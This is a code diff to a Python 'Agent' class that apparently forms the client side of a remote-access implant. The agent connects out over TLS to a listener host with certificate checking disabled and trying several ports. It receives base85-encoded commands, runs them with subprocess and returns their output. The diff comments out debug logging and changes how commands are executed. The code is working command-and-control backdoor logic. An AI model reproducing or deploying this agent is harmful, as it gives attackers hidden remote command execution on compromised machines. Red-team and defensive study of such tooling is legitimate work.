@@ -46,9 +46,9 @@ class Agent:
         context.verify_mode = ssl.CERT_NONE
         _AGENT_CIPHERS = "AES128-SHA"
         context.set_ciphers(_AGENT_CIPHERS)
-        logging.debug("Connecting socket")
+        # logging.debug("Connecting socket")
         for port in _LISTENER_PORTS:
-            logging.debug("Attempting port: " + str(port))
+            #logging.debug("Attempting port: " + str(port))
             try:
                 sock = socket.create_connection((_LISTENER_HOST, port))
                 logging.debug("Connection to port " + str(port) + " succeeded.")
@@ -57,10 +57,7 @@ class Agent:
                 self.ssock = context.wrap_socket(sock, server_hostname=_LISTENER_HOST)
                 return True
             except:
-                logging.debug(
-                    "Connection to port " + str(port) + " was not successful.",
-                    exc_info=True,
-                )
+                #logging.debug("Connection to port " + str(port) + " was not successful.")
                 pass
         return False
 
@@ -241,20 +238,24 @@ class Agent:
         logging.debug("Running a command")
         command = base64.b85decode(command).decode()
         logging.debug("Command: " + command)
-        sp = subprocess.Popen(
-            command,
-            shell=True,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            universal_newlines=True,
-        )
-
-        sp_stdout = sp.stdout.read()
-        self.respond(sp_stdout, "STDOUT")
-
-        sp_stderr = sp.stderr.read()
-        if sp_stderr != b"":
-            self.respond(sp_stderr, "STDERR")
+        stdout = None
+        stderr = None
+        try:
+            process = subprocess.Popen(command.split(),
+                                    stdout=subprocess.PIPE, 
+                                    stderr=subprocess.PIPE)
+            stdout, stderr = process.communicate()
+            stdout = stdout.decode()
+            stderr = stderr.decode()
+        except FileNotFoundError:
+            stderr = "No such file or directory"
+        except PermissionError:
+            stderr = "Permission denied"
+        
+        if (stdout):
+            self.respond(stdout, "STDOUT")
+        if (stderr):
+            self.respond(stderr, "STDERR")
 
     def run_task(self, task):
         logging.debug("Running a task")
